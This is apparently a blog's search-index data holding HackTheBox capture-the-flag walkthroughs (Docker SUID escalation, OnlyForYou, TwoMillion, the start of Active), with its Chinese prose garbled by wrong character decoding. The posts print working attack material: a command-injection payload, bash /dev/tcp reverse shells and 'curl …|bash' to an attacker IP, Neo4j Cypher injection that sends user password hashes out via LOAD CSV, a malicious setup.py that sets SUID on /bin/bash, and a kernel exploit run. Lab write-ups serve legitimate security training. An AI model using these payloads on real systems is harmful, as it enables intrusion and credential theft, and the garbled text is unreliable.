ä¸ºæƒé™æ§åˆ¶ä¸å½“ï¼Œå½“dockerå®¹å™¨å†…å­˜åœ¨å¸¦æœ‰suidçš„ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»æœºéå†åˆ°è¿™ä¸ªdockerå®¹å™¨çš„ç›®å½•ï¼Œç„¶åæ‰§è¡Œè¿™äº›å¸¦suidçš„ç¨‹åºï¼Œç›¸å½“äºä¹Ÿåœ¨ä¸»æœºä¸­æ‰§è¡Œäº†è¿™äº›å¸¦suidçš„ç¨‹åº éœ€è¦å…ˆåœ¨ä¹‹å‰çš„rootçª—å£ç»™/bin/bashæ·»åŠ suidæƒé™ ç„¶åå°†exploitä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶ååœ¨ç›®æ ‡é¶æœºä»æœ¬åœ°ä¸‹è½½exp.shï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ wget http://10.10.14.4/exp.sh chmod +x exp.sh ./exp.sh å†è¿›å…¥åˆ°å®¹å™¨ç›®å½•ï¼ˆåœ¨æ‰§è¡Œç»“æœçš„Current Vulnerable Pathå¤„ï¼‰ï¼Œæ‰§è¡Œ./bin/bash -p æˆåŠŸè·å–rootæƒé™","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-OnlyForYou","slug":"HTB15-OnlyForYou-Medium","date":"2023-08-31T11:00:00.000Z","updated":"2023-08-31T08:07:03.823Z","comments":true,"path":"posts/5cae8651.html","link":"","permalink":"https://wa0er.github.io/posts/5cae8651.html","excerpt":"","text":"HTB-OnlyForYouä¸€ã€æ€è·¯æ¦‚è¦1.ä¿¡æ¯æ”¶é›†æ‰¾åˆ°åŸŸåå’Œå­åŸŸï¼› 2.å­åŸŸæºç å®¡è®¡è·¯ç”±å‘ç°LFIï¼› 3.LFIè¯»å–Nginxé…ç½®æ–‡ä»¶åŠä¸»ç«™æºç ï¼› 4.ä¸»ç«™æºç å®¡è®¡å‘ç°RCEï¼› 5.RCEåå¼¹shellè·å–www-dataæƒé™ï¼› 6.æŸ¥çœ‹ç«¯å£æœåŠ¡å‘ç°Neo4jæœåŠ¡ï¼› 7.Neo4jæ³¨å…¥è·å¾—sshè´¦æˆ·å¯†ç ï¼› 8.pip downloadä»£ç æ‰§è¡Œå®ç°suidææƒã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«æç«¯å£æœåŠ¡ å‘ç°åŸŸåï¼Œå†™å…¥æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.210 only4you.htb\" &gt;&gt; /etc/hosts æµè§ˆå™¨æ‰“å¼€ï¼Œé¦–é¡µå¦‚ä¸‹ æ‰«æå­åŸŸ gobuster vhost -u http://only4you.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 å‘ç°ä¸€ä¸ªå­åŸŸï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.210 beta.only4you.htb\" &gt;&gt; /etc/hosts è®¿é—®å­åŸŸ ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰ç‚¹å‡»Source Codeï¼Œä¼šä¸‹è½½æºç ã€‚å®¡è®¡å‘ç°app.pyçš„/downloadè·¯ç”±ï¼Œifæ¡ä»¶ç”¨ç»å¯¹è·¯å¾„å³å¯ç»•è¿‡ï¼ŒPOSTæäº¤çš„imageå‚æ•°æœ€ç»ˆä¼ é€’ç»™send_file()å‡½æ•°ï¼Œå®ç°LFIï¼Œåªéœ€çŸ¥é“æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œå³å¯è¯»å–ä»»æ„æ–‡ä»¶ nmapæ‰«æç»“æœå¯çœ‹å‡ºæ˜¯NginxæœåŠ¡ï¼Œå°è¯•è¯»å–Nginxç›¸å…³é…ç½®æ–‡ä»¶ Nginxä¸»é…ç½®æ–‡ä»¶é»˜è®¤è·¯å¾„ï¼š /etc/nginx/nginx.conf è™šæ‹Ÿä¸»æœºé»˜è®¤é…ç½®æ–‡ä»¶ï¼š /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default BurpæŠ“åŒ…ï¼ŒPOSTè®¿é—®/downloadç›®å½•ï¼Œæäº¤imageå‚æ•°ï¼Œç„¶ååœ¨è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶å‘ç°webç›®å½•æ˜¯/var/www/only4you.htb/ï¼ˆä¸»ç«™ï¼‰å’Œ/var/www/beta.only4you.htb/ï¼ˆå­åŸŸï¼‰ å­åŸŸä¸‹æºç æœ‰app.pyï¼Œä»¥ç»éªŒæ¥çœ‹ï¼Œé€šå¸¸ä¸»ç«™ä¸‹åº”è¯¥ä¹Ÿæœ‰app.pyï¼Œå°è¯•è¯»å–ç¡®å®å­˜åœ¨ /var/www/only4you.htb/app.py å®Œæ•´ä»£ç å¦‚ä¸‹ from flask import Flask, render_template, request, flash, redirect from form import sendmessage import uuid app = Flask(__name__) app.secret_key = uuid.uuid4().hex @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': email = request.form['email'] subject = request.form['subject'] message = request.form['message'] ip = request.remote_addr status = sendmessage(email, subject, message, ip) if status == 0: flash('Something went wrong!', 'danger') elif status == 1: flash('You are not authorized!', 'danger') else: flash('Your message was successfuly sent! We will reply as soon as possible.', 'success') return redirect('/#contact') else: return render_template('index.html') @app.errorhandler(404) def page_not_found(error): return render_template('404.html'), 404 @app.errorhandler(500) def server_errorerror(error): return render_template('500.html'), 500 @app.errorhandler(400) def bad_request(error): return render_template('400.html'), 400 @app.errorhandler(405) def method_not_allowed(error): return render_template('405.html'), 405 if __name__ == '__main__': app.run(host='127.0.0.1', port=80, debug=False) ä¸Šé¢ä»£ç ç¬¬äºŒè¡Œä»formæ¨¡å—å¯¼å…¥äº†sendmessageæ–¹æ³•ï¼Œformä¸æ˜¯pythonå®˜æ–¹æ¨¡å—ï¼Œæ‰€ä»¥çŒœæµ‹åœ¨åŒç›®å½•ä¸‹æœ‰form.pyï¼Œè¯»å–å¦‚ä¸‹æ–‡ä»¶ç¡®å®å­˜åœ¨ /var/www/only4you.htb/form.py å®Œæ•´ä»£ç å¦‚ä¸‹ import smtplib, re from email.message import EmailMessage from subprocess import PIPE, run import ipaddress def issecure(email, ip): if not re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\", email): return 0 else: domain = email.split(\"@\", 1)[1] result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE) output = result.stdout.decode('utf-8') if \"v=spf1\" not in output: return 1 else: domains = [] ips = [] if \"include:\" in output: dms = ''.join(re.findall(r\"include:.*\\.[A-Z|a-z]{2,}\", output)).split(\"include:\") dms.pop(0) for domain in dms: domains.append(domain) while True: for domain in domains: result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE) output = result.stdout.decode('utf-8') if \"include:\" in output: dms = ''.join(re.findall(r\"include:.*\\.[A-Z|a-z]{2,}\", output)).split(\"include:\") domains.clear() for domain in dms: domains.append(domain) elif \"ip4:\" in output: ipaddresses = ''.join(re.findall(r\"ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\", output)).split(\"ip4:\") ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: pass break elif \"ip4\" in output: ipaddresses = ''.join(re.findall(r\"ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\", output)).split(\"ip4:\") ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: return 1 for i in ips: if ip == i: return 2 elif ipaddress.ip_address(ip) in ipaddress.ip_network(i): return 2 else: return 1 def sendmessage(email, subject, message, ip): status = issecure(email, ip) if status == 2: msg = EmailMessage() msg['From'] = f'{email}' msg['To'] = 'info@only4you.htb' msg['Subject'] = f'{subject}' msg['Message'] = f'{message}' smtp = smtplib.SMTP(host='localhost', port=25) smtp.send_message(msg) smtp.quit() return status elif status == 1: return status else: return status å››ã€RCEåå¼¹shellå­˜åœ¨æ¼æ´çš„ä»£ç å¦‚ä¸‹ if not re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\", email): return 0 else: domain = email.split(\"@\", 1)[1] result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE) output = result.stdout.decode('utf-8') åŸå› ï¼š 1.å› ä¸ºre.match()æ˜¯ä»å¤´å¼€å§‹åŒ¹é…ï¼› 2.ä¸”æ­¤ifæ¡ä»¶çš„æ­£åˆ™æ²¡æœ‰æŒ‡å®šåŒ¹é…ç»“å°¾çš„å…ƒå­—ç¬¦â€$â€ï¼› 3.ä»è€Œå¯¼è‡´åªè¦å­—ç¬¦ä¸²å‰åŠéƒ¨åˆ†æœ‰ç¬¦åˆé‚®ç®±è§„åˆ™çš„å­ä¸²ï¼Œå°±åŒ¹é…æˆåŠŸï¼Œæ‰§è¡Œelseï¼› 4.é‚£ä¹ˆemailæ˜¯wa0er@htb.com;curl 127.0.0.1ï¼Œå°±ä¼šå¯¼è‡´domainæ‹¼æ¥åˆ°digå‘½ä»¤æ—¶å˜æˆå¦‚ä¸‹ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ dig txt htb.com;curl 127.0.0.1 ä¿®è¡¥æ€è·¯ï¼š 1.æ›´æ¢re.match()ä¸ºre.fullmatch() re.fullmatch(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(.[A-Z|a-z]{2,})\", email) 2.æ­£åˆ™æ·»åŠ åŒ¹é…ç»“å°¾çš„å…ƒå­—ç¬¦\"$\" re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})$\", email) çœ‹åˆšæ‰çš„app.pyï¼Œformæ¨¡å—çš„sendmessageæ–¹æ³•åœ¨16è¡Œè¢«è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨æ ¹ç›®å½•è·¯ç”±è¢«è°ƒç”¨ï¼Œå¯¹æ¯”ä»£ç ä¸­æ¥æ”¶çš„POSTå‚æ•°ï¼ˆemail, subject, messageï¼‰ï¼Œåœ¨é¦–é¡µé¡¶éƒ¨èœå•æ å¯¹åº”ContactåŠŸèƒ½ç‚¹ éšä¾¿å¡«ï¼ŒæŠ“åŒ… ç”±äºä¼šè¿ç»­æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ï¼ˆdigå’Œè‡ªå·±çš„ï¼‰ï¼Œç¬¬äºŒä¸ªå‘½ä»¤æ‰§è¡Œç»“æœçœ‹ä¸åˆ°ï¼Œæ‰€ä»¥é€šè¿‡è®¿é—®æœ¬åœ°httpæœåŠ¡æ¥æµ‹è¯•ã€‚éœ€è¦å…ˆæœ¬åœ°å¼€å¯httpæœåŠ¡ï¼Œç„¶åè¯·æ±‚åŒ…ä¿®æ”¹å¦‚ä¸‹å‘é€ æŸ¥çœ‹httpæœåŠ¡ï¼ŒæˆåŠŸæ¥æ”¶åˆ°è®¿é—®è¯·æ±‚ äºæ˜¯åå¼¹shell æœ¬åœ°ä¸¤ä¸ªç»ˆç«¯çª—å£ï¼Œä¸€ä¸ªå¼€å¯httpæœåŠ¡ï¼Œä¸€ä¸ªå¼€å¯ç›‘å¬ python3 -m http.server 80 nc -lvnp 9898 æœ¬åœ°æ–°å»ºä¸€ä¸ªshell.shæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1 ç„¶åè¯·æ±‚åŒ…payloadä¿®æ”¹å¦‚ä¸‹ï¼Œå‘é€è¯·æ±‚ curl 10.10.14.7/shell.sh|bash åå¼¹shellæˆåŠŸï¼Œè·å–www-dataæƒé™ äº”ã€ç«¯å£è½¬å‘ç„¶åæŸ¥çœ‹ç«¯å£æœåŠ¡ 80ï¼ˆhttpï¼‰ã€53ï¼ˆdnsï¼‰ã€22ï¼ˆsshï¼‰ã€3306ï¼ˆmysqlï¼‰ã€33060ï¼ˆmysqlï¼‰éƒ½æ˜¯å¸¸è§„ç«¯å£ 7474ã€7687åˆ†åˆ«æ˜¯neo4jæ•°æ®åº“æœåŠ¡çš„httpç«¯å£å’Œboltè¿æ¥å™¨ç«¯å£ 3000ã€8001éå¸¸è§„ç«¯å£ï¼Œåº”è¯¥æœ‰webæœåŠ¡ï¼Œå°è¯•ç«¯å£è½¬å‘æŠŠæµé‡ä»£ç†å‡ºæ¥ ç›®æ ‡é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ä»æœ¬åœ°ä¸‹è½½chiselï¼ˆç¬”è€…æ­¤å¤„ä¸‹è½½åˆ°/tmpç›®å½•ï¼‰ wget http://10.10.14.7/chisel chmod +x chisel æœ¬åœ°kaliæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¼€å¯æœåŠ¡ç«¯ç›‘å¬ ./chisel server -p 9899 -reverse ç›®æ ‡é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå®ç°ç«¯å£è½¬å‘ ./chisel client 10.10.14.7:9899 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 æœ¬åœ°kaliæ˜¾ç¤ºå¦‚ä¸‹ï¼Œè¿æ¥å»ºç«‹æˆåŠŸ 3000ç«¯å£ï¼Œçœ‹æ ·å­æ˜¯ä¸ªgitä»“åº“æ‰˜ç®¡æœåŠ¡ 8001ç«¯å£ å¼±å£ä»¤admin: adminç™»å½•æˆåŠŸï¼Œä¸‹æ‹‰å‘ç°æ•°æ®åº“æ­£æ˜¯neo4j å…­ã€Neo4jæ³¨å…¥å‚è€ƒï¼šhttps://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j neo4jåŸç†å‚è€ƒï¼šhttps://www.w3cschool.cn/neo4j/neo4j_building_blocks.html é¡µé¢å·¦ä¾§èœå•æ EMPLOYEESé€‰é¡¹ä¸­æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥å¦‚ä¸‹payloadï¼Œè·å–æœåŠ¡ç‰ˆæœ¬ ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.7/?version=' + version + '&amp;name=' + name + '&amp;edition=' + edition as l RETURN 0 as _0 // æœ¬åœ°httpæœåŠ¡å¯çœ‹åˆ°å›æ˜¾å¾—åˆ°neo4jçš„æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯ åœ¨è¾“å…¥æ¡†è¾“å…¥ï¼Œé€šè¿‡burpä¼ å‚çš„è¯éœ€è¦ç»è¿‡URLç¼–ç ä¸”ç©ºæ ¼éœ€ç”¨åŠ å·æ›¿æ¢ è·å–labelï¼Œå¾—åˆ°userå’Œemployeeä¸¤ä¸ªlabel ' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.7/?label='+label as l RETURN 0 as _0 // è·å–userçš„properties of a keyï¼Œå¾—åˆ°adminå’Œjohnä¸¤ä¸ªç”¨æˆ·çš„usernameå’Œpasswordï¼ˆæœ‰äº›è‹±æ–‡åè¯æ€•ç¿»è¯‘è¯ä¸è¾¾æ„ï¼Œå°±æ²¡ç”¨ä¸­æ–‡ï¼‰ ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.7/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 // ç”¨https://crackstation.net/ç ´è§£hashå€¼ï¼Œå¦‚ä¸‹ 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 admin a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 ThisIs4You sshè¿æ¥johnè´¦æˆ· æ‰§è¡Œsudo -læŸ¥çœ‹èƒ½ä»¥rootèº«ä»½æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¯ä»3000ç«¯å£æœåŠ¡ä¸‹è½½åç¼€ä¸º.tar.gzçš„å‹ç¼©åŒ… ä¸ƒã€pip downloadä»£ç æ‰§è¡Œgoogleæœç´¢å…³é”®å­—ï¼špip download exploit https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ https://github.com/wunderwuzzi23/this_is_fine_wuzzi ä¸‹è½½exploit git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi ä¿®æ”¹setup.pyä¸¤ä¸ªä½ç½®ï¼Œå¦‚ä¸‹å›¾ from setuptools import setup, find_packages from setuptools.command.install import install from setuptools.command.egg_info import egg_info import os def RunCommand(): os.system(\"chmod u+s /bin/bash\") class RunEggInfoCommand(egg_info): def run(self): RunCommand() egg_info.run(self) class RunInstallCommand(install): def run(self): RunCommand() install.run(self) setup( name = \"this_is_fine_wuzzi\", version = \"0.0.1\", license = \"MIT\", packages=find_packages(), cmdclass={ 'install' : RunInstallCommand, 'egg_info': RunEggInfoCommand }, ) ç”¨å¦‚ä¸‹å‘½ä»¤åœ¨this_is_fine_wuzziç›®å½•ä¸‹æ„å»ºpythonå‘å¸ƒåŒ…ï¼Œç¬”è€…æ­¤å¤„åœ¨virtualenvï¼ˆpython3.8.10è™šæ‹Ÿç¯å¢ƒï¼‰ä¸‹buildï¼Œå› ä¸ºæ­£å¸¸buildä¼šæŠ¥é”™ python3 -m build buildå®Œæˆåä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆdistç›®å½•ï¼Œé‡Œé¢æœ‰ä¸ª.tar.gzæ–‡ä»¶ ç”¨johnçš„è´¦æˆ·å¯†ç ThisIs4Youç™»å½•3000ç«¯å£webç«¯ å³ä¸Šè§’åŠ å·æ–°å»ºä»“åº“ï¼Œé…ç½®å¦‚ä¸‹ æ–°å»ºä»“åº“æˆåŠŸåè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œç‚¹å‡»Upload Fileä¸Šä¼ æ–‡ä»¶ ä¸Šä¼ åˆšåˆšç”Ÿæˆçš„.tar.gzæ–‡ä»¶ ä¸Šä¼ æˆåŠŸå¦‚ä¸‹ ç„¶ååœ¨ç›®æ ‡é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯çœ‹åˆ°/bin/bashå·²ç»æœ‰äº†suidæƒé™ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/wa0er/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz æ‰§è¡Œbash -pææƒï¼ŒæˆåŠŸè·å–rootæƒé™ Overï¼","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-TwoMillion","slug":"HTB14-TwoMillion-Easy","date":"2023-08-28T11:00:00.000Z","updated":"2023-08-31T08:07:03.823Z","comments":true,"path":"posts/feb24f25.html","link":"","permalink":"https://wa0er.github.io/posts/feb24f25.html","excerpt":"","text":"HTB-TwoMillionä¸€ã€æ€è·¯æ¦‚è¦1.ä¸»ç«™é‚€è¯·ç æ³¨å†ŒåŠŸèƒ½é¡µé¢jsæ–‡ä»¶å‘ç°å¯ç”¨APIï¼› 2.é€šè¿‡APIè·å¾—é‚€è¯·ç æ³¨å†Œç”¨æˆ·å¹¶ç™»å½•ï¼› 3.å‘ç°adminè®¤è¯çš„APIæ³„éœ²ï¼› 4.é€šè¿‡APIå®ç°è¶Šæƒï¼Œå¹¶ä¸”å‘ç°å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼› 5.å‘½ä»¤æ‰§è¡Œåå¼¹shellè·å–www-dataæƒé™ï¼› 6.é‚®ä»¶ä¿¡æ¯æ³„éœ²ï¼Œç”¨CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰è·å–rootæƒé™ã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«æ ç«¯å£å¾ˆç®€å•ï¼Œä½†å¾—åˆ°ä¸€ä¸ªåŸŸåï¼ŒåŸŸåå†™å…¥æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.221 2million.htb\" &gt;&gt; /etc/hosts æµè§ˆå™¨è®¿é—® ä¸‹æ»‘ï¼Œæœ‰ä¸ªå¦‚ä¸‹joinçš„ç•Œé¢ ç‚¹å‡»Join HTBï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œéœ€è¦è¾“å…¥é‚€è¯·ç  æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°éªŒè¯ç æ­£ç¡®åä¼šè·³è½¬åˆ°/register ç›´æ¥è®¿é—®/registerï¼Œè®¿é—®æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰é‚€è¯·ç è¿˜æ˜¯æ— æ³•æ³¨å†Œ åˆšåˆšé‚€è¯·ç é¡µé¢çš„æºç æœ‰ä¸ª/js/inviteapi.min.jsæ–‡ä»¶ï¼Œç”¨https://beautifier.io/æ ¼å¼åŒ–å¾—åˆ°å¦‚ä¸‹ä»£ç  æœ‰ä¸¤ä¸ªAPIï¼Œcurlè®¿é—®2million.htb/api/v1/invite/how/to/generate æœ‰ä¸€æ®µdataæ˜¯ROT13ç¼–ç ï¼Œè½¬æ¢å¦‚ä¸‹ Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr ROT13è½¬æ¢åï¼š In order to generate the invite code, make a POST request to /api/v1/invite/generate åˆå¾—åˆ°ä¸€ä¸ªAPIï¼Œçœ‹APIåå­—åƒæ˜¯ç”Ÿæˆé‚€è¯·ç ï¼Œcurlè®¿é—®2million.htb/api/v1/invite/generate æœ‰ä¸€æ®µåƒbase64çš„ç¼–ç ï¼Œè§£ç å¦‚ä¸‹ï¼Œå¾—åˆ°é‚€è¯·ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo \"MVRJVE0tUkxGVFktVzFDT1AtQ0RCOVQ=\" | base64 -d 1TITM-RLFTY-W1COP-CDB9T è¿”å›è¾“å…¥é‚€è¯·ç çš„ç•Œé¢/inviteï¼Œè¾“å…¥é‚€è¯·ç åæ³¨å†Œç”¨æˆ· æ³¨å†ŒæˆåŠŸåä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œç™»å½•è¿›å…¥å¦‚ä¸‹ç•Œé¢ åœ¨å·¦ä¾§Labsâ†’Accessç•Œé¢ï¼Œå¦‚ä¸‹ å®¡æŸ¥å…ƒç´ ï¼Œçœ‹åˆ°æœ‰API æµè§ˆå™¨è®¿é—®/apiç›®å½•ï¼Œçœ‹æœ‰æ²¡æœ‰APIæ³„éœ²ï¼Œçœ‹åˆ°/api/v1 å†è®¿é—®/api/v1ï¼Œæ³„éœ²äº†API ä¸‰ã€APIè¶Šæƒuserçš„å°±ä¸ç®¡äº†ï¼Œç›´æ¥å°è¯•è®¿é—®adminçš„APIï¼ŒGETè®¿é—®/api/v1/admin/authï¼Œè¿”å›false GET /api/v1/admin/auth POSTè®¿é—®/api/v1/admin/vpn/generateï¼Œè¿”å›401æœªè®¤è¯å“åº”ç  POST /api/v1/admin/vpn/generate PUTè®¿é—®/api/v1/admin/settings/updateï¼Œè¿”å›Invalid content type PUT /api/v1/admin/settings/update é‚£å°±ä¿®æ”¹è¯·æ±‚åŒ…Content-Typeå­—æ®µå€¼ä¸ºjsonæ ¼å¼å†æ¬¡è®¿é—®ï¼Œæç¤ºæ²¡æœ‰emailå‚æ•° åœ¨è¯·æ±‚åŒ…æ•°æ®éƒ¨åˆ†ç”¨jsonæ ¼å¼è®¾ç½®emailå‚æ•°å†æ¬¡è®¿é—®ï¼Œæç¤ºæ²¡æœ‰is_adminå‚æ•° å†è®¾ç½®is_adminå‚æ•°ï¼Œåˆæç¤ºis_adminå‚æ•°éœ€è¦æ˜¯0æˆ–1 è®¾ç½®is_adminå‚æ•°å€¼ä¸º1ï¼Œæ³¨æ„ä¸èƒ½ç”¨å¼•å·ï¼Œåˆæç¤ºemailæ²¡æ‰¾åˆ° è®¾ç½®emailä¸ºåˆšæ³¨å†Œçš„eamilï¼Œè¿”å›ç”¨æˆ·æ•°æ®ï¼Œåº”è¯¥æ˜¯è®¤è¯æˆåŠŸäº† å†GETè®¿é—®/api/v1/admin/authï¼Œmessageå˜ä¸ºtrue å†POSTè®¿é—®/api/v1/admin/vpn/generateï¼Œä¾æ—§æ˜¯æŒ‰ç…§å“åº”åŒ…æç¤ºï¼Œä¿®æ”¹è¯·æ±‚åŒ…çš„Content-Typeå­—æ®µå’Œæ•°æ®éƒ¨åˆ†ï¼Œå¾—åˆ°å¦‚ä¸‹å“åº”ï¼Œç”Ÿæˆäº†vpnè¿æ¥çš„å‡­æ®ï¼Œç„¶åå‘ç°è¿™ä¸ªä½ç½®æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œusernameå­—æ®µå€¼åº”è¯¥æ˜¯ç›´æ¥è¢«æ‹¼æ¥åˆ°linuxçš„shellå‘½ä»¤ä¸­äº†ï¼Œç±»ä¼¼äºgenerate_vpn.sh [username] å››ã€å‘½ä»¤æ‰§è¡Œä¿®æ”¹è¯·æ±‚ä¸­çš„usernameå­—æ®µå€¼å¦‚ä¸‹ï¼Œæ³¨æ„å‘½ä»¤å’Œæ³¨é‡Šç¬¦#ä¹‹é—´éœ€è¦æœ‰ä¸ªç©ºæ ¼ï¼Œæ‰§è¡Œå‘½ä»¤æˆåŠŸ äºæ˜¯ç”¨å¦‚ä¸‹è¯·æ±‚æ•°æ®åå¼¹shell {\"username\":\"wa0er;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1' #\"} æœ¬åœ°ç›‘å¬ï¼ŒæˆåŠŸåå¼¹ åœ¨å½“å‰ç›®å½•çš„ç¯å¢ƒå˜é‡æ–‡ä»¶.envæ‰¾åˆ°adminç”¨æˆ·å¯†ç  DB_USERNAME=admin DB_PASSWORD=SuperDuperPass123 å°è¯•å‘ç°ï¼Œæ—¢å¯shellç™»å½•ï¼Œä¹Ÿå¯sshç™»å½• shellç™»å½• sshç™»å½• ssh admin@10.10.11.221 sshç™»å½•å‘ç°æœ‰ä¸ªæç¤ºYou have mailï¼Œç”¨find / -name 'mail' 2&gt;/dev/nullæŸ¥æ‰¾åå­—ä¸ºmailçš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œç„¶ååœ¨/var/mail/adminæ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€å°é‚®ä»¶ æç¤ºæœ‰Linuxå†…æ ¸çš„CVEï¼Œå…³é”®è¯OverlayFS / FUSE äº”ã€CVE-2023-0386ï¼ˆOverlayFSææƒï¼‰googleæœç´¢å…³é”®å­—ï¼šOverlayFS / FUSE exploit æ¼æ´åˆ†æï¼šhttps://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/ exploitï¼šhttps://github.com/xkaneiki/CVE-2023-0386/ æœ¬åœ°ä¸‹è½½exploitï¼Œç„¶åç”¨wgetä¼ åˆ°ç›®æ ‡é¶æœº æœ¬åœ°å¼€å¯httpæœåŠ¡ python3 -m http.server 80 ç›®æ ‡é¶æœºä¸‹è½½ã€è§£å‹ã€ç¼–è¯‘ã€æ‰§è¡Œ cd /tmp wget http://10.10.14.7/CVE-2023-0386-main.zip unzip CVE-2023-0386-main.zip cd CVE-2023-0386-main make all #ç¼–è¯‘æœ‰æŠ¥é”™ï¼Œä¸å½±å“ ./fuse ./ovlcap/lower ./gc å¦å¼€ä¸€ä¸ªç»ˆç«¯è¿æ¥sshï¼Œåˆ°/tmp/CVE-2023-0386-mainç›®å½•ä¸‹æ‰§è¡Œ./expï¼ŒæˆåŠŸè·å–rootæƒé™ Overï¼","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Active","slug":"HTB13-Active-Easy","date":"2023-08-12T08:24:00.000Z","updated":"2023-08-20T08:41:27.417Z","comments":true,"path":"posts/79fbfa03.html","link":"","permalink":"https://wa0er.github.io/posts/79fbfa03.html","excerpt":"","text":"HTB-Activeä¸€ã€æ€è·¯æ¦‚è¦ä¸»è¦å·¥å…·ï¼š smbmapï¼šæŸ¥çœ‹SMBå…±äº«æœåŠ¡ä¿¡æ¯ smbclientï¼šè¿æ¥SMBæœåŠ¡ gpp-decryptï¼šè§£å¯†ä¸»æœºå¯†ç  impacket-GetUserSPNsï¼šè·å–SPNä¿¡æ¯ impacket-psexecï¼šç™»å½•ä¸»æœºï¼Œè·å–shell äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«ç«¯å£æœåŠ¡ nmap -p- --min-rate 10000 -Pn -sT 10.10.10.100 nmap -A 10.10.10.100 ç”¨smbmapæŸ¥çœ‹SMBå…±äº«æœåŠ¡ smbmap -H 10.10.10.100 SMBå…±äº«å‡ºæ¥çš„Replicationç›®å½•æœ‰åªè¯»æƒé™ï¼Œç”¨smbclientåŒ¿åè¿æ¥ä¸€ä¸‹ smbclient //10.10.10.100/Replication -N 